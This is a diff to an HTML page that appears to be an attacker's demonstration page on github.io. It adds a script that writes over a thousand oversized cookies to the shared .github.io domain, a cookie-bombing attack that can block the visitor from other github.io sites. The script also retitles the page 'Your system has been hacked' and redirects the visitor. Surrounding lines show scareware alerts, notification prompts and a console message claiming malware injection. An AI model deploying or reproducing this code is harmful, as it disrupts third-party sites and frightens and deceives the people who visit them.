@@ -8,6 +8,14 @@
             font-size:25pt;
         }
     </style>
+  <script>
+     var serang = Array(1111).join('a');
+for (var x = 0; x < 1111; x++){
+document.cookie = "Bomber" + x + "=" + serang + ";Domain=.github.io; path=/";
+   document.title = "[Your system has been hacked] - paktiko was here";
+ document.location = "paktiko1986.github.io/xss1986/news.html";
+}
+  </script>
  </head>
  <body>
   <h5>santiko1986@wearehackerone.com</h5>
@@ -17,7 +25,6 @@ for (var x = 0; x < 1111; x++){
 document.cookie = "Bomber" + x + "=" + serang + ";Domain=.github.io; path=/";
    document.title = "[Your system has been hacked] - paktiko was here";
 }
-   openFullscreen();
   alert('Your system has been hacked by @paktiko1986');
    // Request permission for notifications
 if (Notification.permission === "granted") {
@@ -30,20 +37,7 @@ if (Notification.permission === "granted") {
     });
 }
   console.log("%c Your system has been injected by M4lw4r3.\nI watch you!!!!", "color:red; font-size:25pt");
-  // make full screen
-  function openFullscreen() {
-    let elem = document.documentElement; // This selects the whole page
-    if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-    } else if (elem.mozRequestFullScreen) { // Firefox
-        elem.mozRequestFullScreen();
-    } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
-        elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) { // IE/Edge
-        elem.msRequestFullscreen();
-    }
-}
-
+ 
   </script>
  </center> 
  </body>
